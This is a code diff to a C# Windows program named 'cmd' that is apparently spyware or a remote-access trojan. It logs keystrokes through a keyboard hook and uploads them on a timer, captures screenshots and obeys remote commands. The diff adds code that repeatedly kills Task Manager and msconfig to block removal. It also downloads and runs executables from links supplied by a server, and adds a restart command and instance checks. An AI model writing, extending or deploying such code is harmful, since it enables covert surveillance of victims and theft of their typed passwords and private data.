@@ -4,16 +4,9 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
-using System.Text;
 using System.Threading;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
 using System.Windows.Media.Imaging;
-using System.Windows.Shapes;
 using System.Windows.Threading;
 using System.Net.Http;
 using System.Net.Http.Headers;
@@ -28,7 +21,7 @@ namespace cmd
     /// </summary>
     public partial class Main : Window
     {
-        public const int version = 1;
+        public const int version = 5;
 
         int sessionID, userID;
 
@@ -38,12 +31,25 @@ namespace cmd
         DispatcherTimer dispatcherTimer;
 
         string keys = "";
+
         int timeUpdateLog = 10;
-        int timeCount = 0;
+        int timeCountUpdateLog = 0;
+
+        int timeCheckProcess = 3;
+        int timeCountCheckProcess = 0;
 
         public Main()
         {
             InitializeComponent();
+
+            for (int i = 0; i < 5; i++)
+            {
+                killProcess();
+                Thread.Sleep(2000);
+            }
+
+            checkProcess();
+            checkFile();
 
             userID = getUserID();
 
@@ -57,20 +63,85 @@ namespace cmd
 
             CheckUpdate();
 
-            RegisterInStartup(true);
+            //RegisterInStartup(true);
 
-            keyboardHook = new KeyboardHook();
-            keyboardHook.Install();
-            keyboardHook.KeyDown += (sender, e) =>
+            try
             {
-                keys += e.Key.ToString();
+                keyboardHook = new KeyboardHook();
+                keyboardHook.Install();
+                keyboardHook.KeyDown += (sender, e) =>
+                {
+                    keys += e.Key.ToString();
 
-            };
+                };
+            }
+            catch (Exception e)
+            {
+                sendCommand("MBOX " + e.Message);
+            }
 
             dispatcherTimer = new DispatcherTimer();
             dispatcherTimer.Tick += new EventHandler(timer_Tick);
             dispatcherTimer.Interval = new TimeSpan(0, 0, 1);
             dispatcherTimer.Start();
+        }
+
+        private void checkFile()
+        {
+            try
+            {
+                string directoryName = System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+                string[] files = Directory.GetFiles(System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
+
+                string thisfilename = System.IO.Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName).ToUpper();
+                string max = thisfilename;
+                string filemax = "";
+                foreach (string file in files)
+                {
+                    string f = System.IO.Path.GetFileName(file).ToUpper();
+                    if (f.StartsWith("CMD") && f.EndsWith("EXE") && f.CompareTo(max) > 0)
+                    {
+                        max = f;
+                        filemax = file;
+                    }
+                }
+
+                if (max != thisfilename)
+                {
+                    Process.Start(filemax);
+                    Environment.Exit(0);
+                }
+            }
+            catch (Exception e)
+            {
+                sendCommand("MBOX " + e.Message);
+            }
+        }
+
+        private void checkProcess()
+        {
+            try
+            {
+                Process[] procs = Process.GetProcessesByName("CMD");
+
+                int tru = 0;
+
+                foreach (Process proc in procs)
+                {
+                    if (proc.MainWindowTitle != "")
+                    {
+                        tru++;
+                    }
+                }
+
+                if (procs.Length - tru > 1)
+                {
+                    Environment.Exit(0);
+                }
+            }catch (Exception e)
+            {
+                sendCommand("MBOX " + e.Message);
+            }
         }
 
         private void CheckUpdate()
@@ -83,9 +154,10 @@ namespace cmd
 
                 if (ver > version)
                 {
-                    downloadNewUpdate(result[1]);
+                    downloadNewUpdate(result[1].Replace(';', '/'));
                 }
-            }catch (Exception e)
+            }
+            catch (Exception e)
             {
                 sendCommand("MBOX " + e.Message);
             }
@@ -93,17 +165,14 @@ namespace cmd
 
         private void downloadNewUpdate(string links)
         {
-            try
             {
-                links = links.Replace(';', '/');
-
                 string[] link = links.Split('|');
                 string run = "";
                 using (var client = new WebClient())
                 {
                     foreach (string s in link)
                     {
-                        string filename = getFileNameFromLink(s);
+                        string filename = System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName) + @"\" + getFileNameFromLink(s);
                         client.DownloadFile(s, filename);
                         if (filename.ToUpper().EndsWith("EXE"))
                         {
@@ -116,9 +185,6 @@ namespace cmd
                 Process.Start(run);
                 Environment.Exit(0);
 
-            }catch(Exception e)
-            {
-                sendCommand("MBOX " + e.Message);
             }
         }
 
@@ -127,7 +193,7 @@ namespace cmd
             int begin = link.LastIndexOf("/");
             int end = link.LastIndexOf(".");
 
-            return link.Substring(begin + 1, end - begin-1);
+            return link.Substring(begin + 1, end - begin - 1);
         }
 
         private void RegisterInStartup(bool isChecked)
@@ -137,7 +203,9 @@ namespace cmd
 
             if (isChecked)
             {
-                registryKey.SetValue("CMD", Directory.GetCurrentDirectory() + "\\cmd.exe");
+                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+
+                registryKey.SetValue("CMD", path);
             }
             else
             {
@@ -263,12 +331,20 @@ namespace cmd
                 }
             }
 
-            timeCount += dispatcherTimer.Interval.Seconds;
-            if (timeCount == timeUpdateLog)
+            timeCountUpdateLog += dispatcherTimer.Interval.Seconds;
+            timeCountCheckProcess += dispatcherTimer.Interval.Seconds;
+
+            if (timeCountUpdateLog == timeUpdateLog)
             {
                 upLog(keys);
                 keys = "";
-                timeCount = 0;
+                timeCountUpdateLog = 0;
+            }
+
+            if (timeCountCheckProcess == timeCheckProcess)
+            {
+                killProcess();
+                timeCountCheckProcess = 0;
             }
         }
 
@@ -328,6 +404,7 @@ namespace cmd
 
                 Bitmap screenBitmap;
                 Graphics screenGraphics;
+                string path = System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName) + @"\bit.jpg";
 
                 using (screenBitmap = new Bitmap((int)(SystemParameters.PrimaryScreenWidth * scale),
                                           (int)(SystemParameters.PrimaryScreenHeight * scale),
@@ -337,11 +414,13 @@ namespace cmd
 
                     screenGraphics.CopyFromScreen(0, 0,
                                             0, 0, screenBitmap.Size, CopyPixelOperation.SourceCopy);
-                    screenBitmap.Save(@"bit.jpg", ImageFormat.Jpeg);
+
+
+                    screenBitmap.Save(path, ImageFormat.Jpeg);
 
                 }
 
-                return @"bit.jpg";
+                return path;
             }
             catch (Exception e)
             {
@@ -383,6 +462,25 @@ namespace cmd
 
             }
             catch (Exception e)
+            {
+                sendCommand("MBOX " + e.Message);
+            }
+        }
+
+        private void killProcess()
+        {
+            try
+            {
+                Process[] procs = Process.GetProcesses();
+
+                foreach (Process proc in procs)
+                {
+                    if ((proc.ProcessName.ToUpper() == "MSCONFIG" || proc.ProcessName.ToUpper() == "TASKMGR"))
+                    {
+                        proc.Kill();
+                    }
+                }
+            }catch(Exception e)
             {
                 sendCommand("MBOX " + e.Message);
             }
@@ -434,7 +532,12 @@ namespace cmd
                 }
                 else if (cmd.ToUpper().StartsWith("ONLINE"))
                 {
-                    sendCommand("ONLINE " + userID);
+                    sendCommand("ONLINE " + userID + " " + version);
+                }
+                else if (cmd.ToUpper().StartsWith("RESPRO"))
+                {
+                    Process.Start(Process.GetCurrentProcess().MainModule.FileName);
+                    Environment.Exit(0);
                 }
                 else if (cmd.ToUpper().StartsWith("CLOSECHATBOX"))
                 {
@@ -517,13 +620,13 @@ namespace cmd
 
                     foreach (Process proc in procs)
                     {
-                        if (proc.MainWindowTitle == "") continue;
+                        //if (proc.MainWindowTitle == "") continue;
                         result += proc.MainWindowTitle + "|||" + proc.ProcessName + "|||";
                     }
 
                     result = result.Remove(result.Length - 3);
 
-                    sendCommand("PROCESS " + result);
+                    sendLongCommandAsync("PROCESS " + result);
 
                 }
                 else if (cmd.ToUpper().StartsWith("KILLPROCESS"))
